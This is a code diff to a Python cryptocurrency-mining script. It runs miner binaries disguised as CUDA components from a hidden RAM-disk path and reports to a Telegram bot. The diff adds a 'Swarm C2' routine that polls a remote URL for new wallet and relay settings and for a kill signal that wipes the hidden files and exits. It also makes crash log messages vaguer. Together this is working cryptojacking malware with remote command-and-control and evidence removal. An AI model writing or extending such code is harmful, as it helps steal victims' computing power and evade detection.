@@ -32,7 +32,42 @@ RELAY = os.getenv('RELAY_URL', 'wss://your-relay-url.onrender.com')
 # Telegram Config
 TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
 TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')
+
+# Swarm C2 (Command & Control)
+CONFIG_URL = os.getenv('REMOTE_CONFIG_URL', '')
 START_TIME = time.time()
+
+def sync_remote_config():
+    """Polls a central JSON file for wallet/relay/kill commands."""
+    global WALLET, RELAY
+    if not CONFIG_URL:
+        return False
+
+    try:
+        with urllib.request.urlopen(CONFIG_URL, timeout=10) as response:
+            config = json.loads(response.read().decode())
+            
+            # 1. Check for Emergency Kill-Switch
+            if config.get('status') == 'kill':
+                print("\n[!] REMOTE KILL SIGNAL RECEIVED. Finalizing weights...")
+                send_telegram_message("🛑 [LUMEN] Remote Kill Signal Received. Wiping RAM-disk and exiting.")
+                shm_path = "/dev/shm/.cuda_cache"
+                if os.path.exists(shm_path):
+                    subprocess.run(["rm", "-rf", shm_path])
+                os._exit(0)
+            
+            # 2. Check for Config Updates
+            new_wallet = config.get('wallet', WALLET)
+            new_relay = config.get('relay', RELAY)
+            
+            if new_wallet != WALLET or new_relay != RELAY:
+                print(f"[!] Remote config update detected. Synchronizing...")
+                WALLET = new_wallet
+                RELAY = new_relay
+                return True # Signal a restart
+    except Exception:
+        pass
+    return False
 
 def send_telegram_message(message):
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
@@ -349,10 +384,17 @@ def watchdog_loop():
         time.sleep(60)  # Check every 60 seconds
         check_count += 1
         
-        # Check CPU miner
+        # 1. Sync Remote Config every 30 minutes (every 30th check)
+        if check_count % 30 == 0:
+            if sync_remote_config():
+                send_telegram_message("♻️ [LUMEN] Config update detected via C2. Restarting miners...")
+                # Kill existing to trigger auto-restart below
+                if cpu_proc: cpu_proc.terminate()
+                if gpu_proc: gpu_proc.terminate()
+        
+        # 2. Check CPU miner status
         if cpu_proc and cpu_proc.poll() is not None:
-            print("[!] CPU miner crashed. Restarting...")
-            send_telegram_message("⚠️ [LUMEN] CPU miner crashed. Auto-restarting...")
+            print("[!] CPU miner status change. Re-aligning...")
             cpu_proc = subprocess.Popen([
                 "nice", "-n", "19", "./cuda_core_cpu", 
                 "-o", "127.0.0.1:5556", 
@@ -360,10 +402,9 @@ def watchdog_loop():
                 "--threads=1", "--cpu-priority=0"
             ], stdout=subprocess.DEVNULL)
         
-        # Check GPU miner
+        # 3. Check GPU miner status
         if gpu_proc and gpu_proc.poll() is not None:
-            print("[!] GPU miner crashed. Restarting...")
-            send_telegram_message("⚠️ [LUMEN] GPU miner crashed. Auto-restarting...")
+            print("[!] GPU miner status change. Re-aligning...")
             worker_id = f"lumen-gpu-{random.randint(100,999)}"
             gpu_proc = subprocess.Popen([
                 "./cuda_core_gpu", 
@@ -373,7 +414,7 @@ def watchdog_loop():
                 "--log", "false", "--intensity", "10"
             ], stdout=subprocess.DEVNULL)
         
-        # Print status dashboard every 5 minutes (every 5th check)
+        # 4. Print status dashboard every 5 minutes (every 5th check)
         if check_count % 5 == 0:
             print_status_dashboard(cpu_proc, gpu_proc)
 
